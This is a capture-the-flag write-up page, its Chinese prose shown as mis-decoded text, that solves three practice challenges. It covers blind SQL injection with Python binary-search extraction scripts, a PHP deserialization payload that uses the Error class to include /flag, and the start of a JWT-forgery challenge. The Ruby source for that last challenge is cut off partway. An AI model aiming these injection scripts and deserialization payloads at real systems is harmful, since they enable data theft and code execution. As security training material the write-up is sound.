<h2 id="GYCTF2020-Ezsqli"><a href="#GYCTF2020-Ezsqli" class="headerlink" title="[GYCTF2020]Ezsqli"></a>[GYCTF2020]Ezsqli</h2><p>è€ƒç‚¹ï¼šSQLæ³¨å…¥<br>å½“æˆ‘ä»¬åˆ†åˆ«è¾“å…¥1ï¼Œ2æ—¶åˆ†åˆ«æ˜¾ç¤ºNu1Lï¼ŒV&amp;N<br>å½“å°è¯•ä½¿ç”¨æ³¨é‡Šç¬¦çš„æ—¶å€™å‘ç°æ³¨é‡Šç¬¦è¢«è¿‡æ»¤äº†<code>#ã€--</code><br>ç»“åˆfuzzï¼Œåœ¨å°è¯•ä¹‹åå‘ç°ä¸‹é¢è¿™ä¸‰ä¸ªå¯ä»¥ä½¿ç”¨</p>
<ul>
<li><p><code>if(1,1,2)</code></p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">IF</span> <span class="token punctuation">(</span>condition<span class="token punctuation">,</span> true_value<span class="token punctuation">,</span> false_value<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<blockquote>
<p>condition æ˜¯ 1ï¼Œè¿™æ˜¯ä¸€ä¸ªå§‹ç»ˆä¸ºçœŸçš„æ¡ä»¶ã€‚<br>true_value æ˜¯ 1ï¼Œå¦‚æœæ¡ä»¶ä¸ºçœŸï¼Œå°†è¿”å›çš„å€¼ã€‚<br>false_value æ˜¯ 2ï¼Œå¦‚æœæ¡ä»¶ä¸ºå‡ï¼Œå°†è¿”å›çš„å€¼ã€‚</p>
</blockquote>
</li>
<li><p><code>0^1</code></p>
<blockquote>
<p>0 ^ 1 çš„ç»“æœæ˜¯ 1ã€‚<br>0 ^ 0 çš„ç»“æœæ˜¯ 0ã€‚</p>
</blockquote>
</li>
<li><p><code>(1&amp;&amp;1)</code></p>
</li>
</ul>
<p><strong>å°è¯•çˆ†æ•°æ®åº“</strong></p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">if</span><span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span>
 
<span class="token number">0</span><span class="token operator">^</span><span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">32</span><span class="token punctuation">)</span>
 
<span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<ul>
<li>database(): è¿™æ˜¯ä¸€ä¸ªSQLå‡½æ•°ï¼Œç”¨äºè¿”å›å½“å‰æ•°æ®åº“çš„åç§°ã€‚å®ƒè¿”å›å­—ç¬¦ä¸²å½¢å¼çš„æ•°æ®åº“åã€‚</li>
<li>substr(database(), 1, 1): è¿™ä½¿ç”¨substrå‡½æ•°ä»å½“å‰æ•°æ®åº“çš„åç§°ä¸­æå–ç¬¬ä¸€ä¸ªå­—ç¬¦ã€‚substrå‡½æ•°çš„å‚æ•°æ˜¯ (string, start, length)ï¼Œæ‰€ä»¥è¿™é‡Œä»æ•°æ®åº“åçš„ç¬¬ä¸€ä¸ªå­—ç¬¦å¼€å§‹ï¼Œå–ä¸€ä¸ªå­—ç¬¦çš„é•¿åº¦ã€‚</li>
<li>ascii(substr(database(), 1, 1)): asciiå‡½æ•°ç”¨äºè·å–å­—ç¬¦çš„ASCIIç å€¼ã€‚åœ¨è¿™é‡Œï¼Œå®ƒè·å–äº†æ•°æ®åº“åçš„ç¬¬ä¸€ä¸ªå­—ç¬¦çš„ASCIIç å€¼ã€‚</li>
<li>if(ascii(substr(database(), 1, 1)) &gt; 32, 1, 2): è¿™æ˜¯ä¸€ä¸ªæ¡ä»¶è¯­å¥ã€‚å¦‚æœæ•°æ®åº“åçš„ç¬¬ä¸€ä¸ªå­—ç¬¦çš„ASCIIç å€¼å¤§äº32ï¼Œæ¡ä»¶ä¸ºçœŸï¼Œè¿”å›1ï¼›å¦åˆ™ï¼Œæ¡ä»¶ä¸ºå‡ï¼Œè¿”å›2ã€‚</li>
</ul>
</blockquote>
<p><code>INFORMATION_SCHEMA</code>è¢«è¿‡æ»¤äº†ï¼Œä½¿ç”¨<code>sys.x$schema_table_statistics_with_buffer</code>ä»£æ›¿ã€‚<br>å‚è€ƒ<a href="https://blog.csdn.net/qq_45521281/article/details/106647880">Bypass information_schemaä¸æ— åˆ—åæ³¨å…¥_WHOAMIAnonyçš„åšå®¢-CSDNåšå®¢</a></p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">if</span><span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> sys<span class="token punctuation">.</span>x$schema_table_statistics_with_buffer <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span>

<span class="token number">0</span><span class="token operator">^</span><span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> sys<span class="token punctuation">.</span>x$schema_table_statistics_with_buffer <span class="token keyword">where</span> table_schema <span class="token operator">=</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">32</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>å‘ç°éƒ½èƒ½å¤Ÿæ­£å¸¸å›æ˜¾ä½¿ç”¨å¼‚æˆ–æˆ–è€…äºŒåˆ†æ³•çš„pythonè„šæœ¬æ¥è¿›è¡Œçˆ†è¡¨</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
<span class="token keyword">import</span> time
url<span class="token operator">=</span><span class="token string">'http://750e4b79-c6f5-42e5-8fc7-dd35e77fa400.node4.buuoj.cn:81/'</span>
flag<span class="token operator">=</span><span class="token string">''</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    high<span class="token operator">=</span><span class="token number">127</span>
    low<span class="token operator">=</span><span class="token number">32</span>
    mid<span class="token operator">=</span><span class="token punctuation">(</span>high<span class="token operator">+</span>low<span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">2</span>
    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
    <span class="token keyword">while</span> high<span class="token operator">></span>low<span class="token punctuation">:</span>

        <span class="token comment">#payload = '1 &amp;&amp; (ascii(substr((select database()),&#123;0&#125;,1))>&#123;1&#125;)'.format(i, mid) #çˆ†åº“</span>
        <span class="token comment">#payload = '1 &amp;&amp; (ascii(substr((select version()),&#123;0&#125;,1))>&#123;1&#125;)'.format(i, mid)# çˆ†ç‰ˆæœ¬</span>
        payload <span class="token operator">=</span> <span class="token string">'1 &amp;&amp; (ascii(substr((select group_concat(table_name) from sys.schema_table_statistics where table_schema=database()),&#123;0&#125;,1))>&#123;1&#125;)'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> mid<span class="token punctuation">)</span> <span class="token comment">#çˆ†è¡¨</span>

        data<span class="token operator">=</span><span class="token punctuation">&#123;</span>
            <span class="token string">'id'</span><span class="token punctuation">:</span>payload
        <span class="token punctuation">&#125;</span>
        response<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>
        response<span class="token punctuation">.</span>encoding<span class="token operator">=</span><span class="token string">"Windows-1252"</span>

        <span class="token keyword">if</span> <span class="token string">'Nu1L'</span> <span class="token keyword">in</span> response<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
            low<span class="token operator">=</span>mid<span class="token operator">+</span><span class="token number">1</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            high<span class="token operator">=</span>mid
        mid<span class="token operator">=</span><span class="token punctuation">(</span>high<span class="token operator">+</span>low<span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">2</span>
    flag<span class="token operator">+=</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>mid<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>çˆ†å‡ºMYSQL5.5.8<br>è¡¨f1ag_1s_h3r3_hhhhh</p>
<p><strong>æ— åˆ—åæ³¨å…¥</strong><br>è¦åˆ©ç”¨åˆ°asciiåç§»æ³¨å…¥ï¼Œä¹Ÿå°±æ˜¯æ¯”è¾ƒç›²æ³¨ï¼Œå…·ä½“å¯å‚è€ƒ<a href="https://blog.csdn.net/qq_45521281/article/details/106647880">Bypass information_schemaä¸æ— åˆ—åæ³¨å…¥_WHOAMIAnonyçš„åšå®¢-CSDNåšå®¢</a></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">
<span class="token keyword">import</span> requests
<span class="token keyword">import</span> time
 
 
url <span class="token operator">=</span> <span class="token string">"http://750e4b79-c6f5-42e5-8fc7-dd35e77fa400.node4.buuoj.cn:81/"</span>
flag <span class="token operator">=</span> <span class="token string">""</span>
i <span class="token operator">=</span> <span class="token number">0</span>
 
 
<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>
    letf <span class="token operator">=</span> <span class="token number">32</span>
    right <span class="token operator">=</span> <span class="token number">127</span>
    <span class="token keyword">while</span> letf <span class="token operator">&lt;</span> right<span class="token punctuation">:</span>
        s <span class="token operator">=</span> flag
        mid <span class="token operator">=</span> <span class="token punctuation">(</span>letf<span class="token operator">+</span>right<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>
        s <span class="token operator">=</span> s <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>mid<span class="token punctuation">)</span>
        payload <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"0^((select * from f1ag_1s_h3r3_hhhhh)>(select 1,'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>s<span class="token punctuation">&#125;</span></span><span class="token string">'))"</span></span>
        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"id"</span><span class="token punctuation">:</span>payload<span class="token punctuation">&#125;</span>
        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>text
        <span class="token keyword">if</span> <span class="token string">"Nu1L"</span> <span class="token keyword">in</span> res<span class="token punctuation">:</span>
            letf <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            right <span class="token operator">=</span> mid
    <span class="token keyword">if</span> letf <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>
        flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>letf<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.2</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="https://img-blog.csdnimg.cn/direct/d29d300f4ae145fba8a3cc081b6ba2fe.png" alt="456"></p>
<h2 id="æå®¢å¤§æŒ‘æˆ˜-2020-Greatphp"><a href="#æå®¢å¤§æŒ‘æˆ˜-2020-Greatphp" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2020]Greatphp"></a>[æå®¢å¤§æŒ‘æˆ˜ 2020]Greatphp</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">SYCLOVER</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$syc</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$lover</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">syc</span> <span class="token operator">!=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">lover</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">syc</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">lover</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">syc</span><span class="token punctuation">)</span><span class="token operator">===</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">lover</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
           <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\&lt;\?php|\(|\)|\"|\'/"</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">syc</span><span class="token punctuation">,</span> <span class="token variable">$match</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
               <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">syc</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
           <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
               <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Try Hard !!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
           <span class="token punctuation">&#125;</span>
           
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'great'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'great'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>è¿™ä¸ªç”¨æ¥è€ƒå¯ŸphpåŸç”Ÿç±»ï¼Œåœ¨é¢˜ç›®ä¸­ç”¨åˆ°äº†Errorç±»ã€‚<br>Errorç±»ä¸­ç”¨åˆ°äº†<code>__toString</code>æ–¹æ³•ï¼ŒMD5()å’Œsha1()å‡½æ•°éƒ½ä¼šè°ƒç”¨<code>__toString()</code>æ–¹æ³•ã€‚<br>ç„¶åå¼€å§‹æ„é€ ï¼Œä½¿ç”¨æ–‡ä»¶åŒ…å«ï¼Œç”±äºæ­£åˆ™è¡¨è¾¾å¼çš„å­˜åœ¨ï¼Œæˆ‘ä»¬è¿›è¡Œå–åç»•è¿‡</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span>
//%D0%99%93%9E%98<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">SYCLOVER</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$syc</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$lover</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">syc</span> <span class="token operator">!=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">lover</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">syc</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">lover</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">syc</span><span class="token punctuation">)</span><span class="token operator">===</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">lover</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\&lt;\?php|\(|\)|\"|\'/"</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">syc</span><span class="token punctuation">,</span> <span class="token variable">$match</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
                <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">syc</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Try Hard !!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>

        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">SYCLOVER</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$str</span><span class="token operator">=</span><span class="token string double-quoted-string">"?>&lt;?=include ~"</span><span class="token operator">.</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"%D0%99%93%9E%98"</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">";?>"</span><span class="token punctuation">;</span>
<span class="token variable">$a</span><span class="token operator">-></span><span class="token property">syc</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">lover</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="SCTF2019-Flag-Shop"><a href="#SCTF2019-Flag-Shop" class="headerlink" title="[SCTF2019]Flag Shop"></a>[SCTF2019]Flag Shop</h2><p>æ‰“å¼€é¢˜ç›®ä¹‹åæµ‹è¯•å„ä¸ªåŠŸèƒ½ï¼Œå‘ç°å­˜åœ¨jwtï¼Œè§£ç ä¹‹åjwtä¸­å¸¦æœ‰jkl<br><img src="https://img-blog.csdnimg.cn/direct/c5c8d86ee1314c268f2b53a1771738b3.png" alt="13"></p>
<p>é‚£ä¹ˆåœ¨è¿™é‡Œå°±æƒ³åˆ°äº†jwtä¼ªé€ ï¼Œæœ€é‡è¦çš„ä¸€ç‚¹å°±æ˜¯è¦çŸ¥é“secret_keyï¼Œè¯¥æ€ä¹ˆå¯»æ‰¾secret_keyå‘¢ï¼Ÿ<br>è®¿é—®robots.txtæ–‡ä»¶å‘ç°æºç è·¯å¾„<code>/filebak</code>ã€‚</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">require</span> <span class="token string-literal"><span class="token string">'sinatra'</span></span>
<span class="token keyword">require</span> <span class="token string-literal"><span class="token string">'sinatra/cookies'</span></span>
<span class="token keyword">require</span> <span class="token string-literal"><span class="token string">'sinatra/json'</span></span>
<span class="token keyword">require</span> <span class="token string-literal"><span class="token string">'jwt'</span></span>
<span class="token keyword">require</span> <span class="token string-literal"><span class="token string">'securerandom'</span></span>
<span class="token keyword">require</span> <span class="token string-literal"><span class="token string">'erb'</span></span>

set <span class="token symbol">:public_folder</span><span class="token punctuation">,</span> <span class="token builtin">File</span><span class="token punctuation">.</span>dirname<span class="token punctuation">(</span>__FILE__<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string-literal"><span class="token string">'/static'</span></span>

<span class="token constant">FLAGPRICE</span> <span class="token operator">=</span> <span class="token number">1000000000000000000000000000</span>
<span class="token constant">ENV</span><span class="token punctuation">[</span><span class="token string-literal"><span class="token string">"SECRET"</span></span><span class="token punctuation">]</span> <span class="token operator">=</span> SecureRandom<span class="token punctuation">.</span>hex<span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">)</span>

configure <span class="token keyword">do</span>
  enable <span class="token symbol">:logging</span>
  file <span class="token operator">=</span> <span class="token class-name">File</span><span class="token punctuation">.</span><span class="token keyword">new</span><span class="token punctuation">(</span><span class="token builtin">File</span><span class="token punctuation">.</span>dirname<span class="token punctuation">(</span>__FILE__<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string-literal"><span class="token string">'/../log/http.log'</span></span><span class="token punctuation">,</span><span class="token string-literal"><span class="token string">"a+"</span></span><span class="token punctuation">)</span>
  file<span class="token punctuation">.</span>sync <span class="token operator">=</span> <span class="token boolean">true</span>
  use Rack<span class="token double-colon punctuation">::</span>CommonLogger<span class="token punctuation">,</span> file
<span class="token keyword">end</span>

get <span class="token string-literal"><span class="token string">"/"</span></span> <span class="token keyword">do</span>
  redirect <span class="token string-literal"><span class="token string">'/shop'</span></span><span class="token punctuation">,</span> <span class="token number">302</span>
<span class="token keyword">end</span>

get <span class="token string-literal"><span class="token string">"/filebak"</span></span> <span class="token keyword">do</span>
  content_type <span class="token symbol">:text</span>
  erb <span class="token builtin">IO</span><span class="token punctuation">.</span>binread __FILE__
<span class="token keyword">end</span>

get <span class="token string-literal"><span class="token string">"/api/auth"</span></span> <span class="token keyword">do</span>
  payload <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token symbol">uid</span><span class="token operator">:</span> SecureRandom<span class="token punctuation">.</span>uuid <span class="token punctuation">,</span> <span class="token symbol">jkl</span><span class="token operator">:</span> <span class="token number">20</span><span class="token punctuation">&#125;</span>
  auth <span class="token operator">=</span> <span class="token constant">JWT</span><span class="token punctuation">.</span>encode payload<span class="token punctuation">,</span><span class="token constant">ENV</span><span class="token punctuation">[</span><span class="token string-literal"><span class="token string">"SECRET"</span></span><span class="token punctuation">]</span> <span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">'HS256'</span></span>
  cookies<span class="token punctuation">[</span><span class="token symbol">:auth</span><span class="token punctuation">]</span> <span class="token operator">=</span> auth
<span class="token keyword">end</span>

get <span class="token string-literal"><span class="token string">"/api/info"</span></span> <span class="token keyword">do</span>
  islogin
  auth <span class="token operator">=</span> <span class="token constant">JWT</span><span class="token punctuation">.</span>decode cookies<span class="token punctuation">[</span><span class="token symbol">:auth</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token constant">ENV</span><span class="token punctuation">[</span><span class="token string-literal"><span class="token string">"SECRET"</span></span><span class="token punctuation">]</span> <span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token symbol">algorithm</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">'HS256'</span></span> <span class="token punctuation">&#125;</span>
  json<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token symbol">uid</span><span class="token operator">:</span> auth<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string-literal"><span class="token string">"uid"</span></span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token symbol">jkl</span><span class="token operator">:</span> auth<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string-literal"><span class="token string">"jkl"</span></span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
<span class="token keyword">end</span>

get <span class="token string-literal"><span class="token string">"/shop"</span></span> <span class="token keyword">do</span>
  erb <span class="token symbol">:shop</span>
<span class="token keyword">end</span>

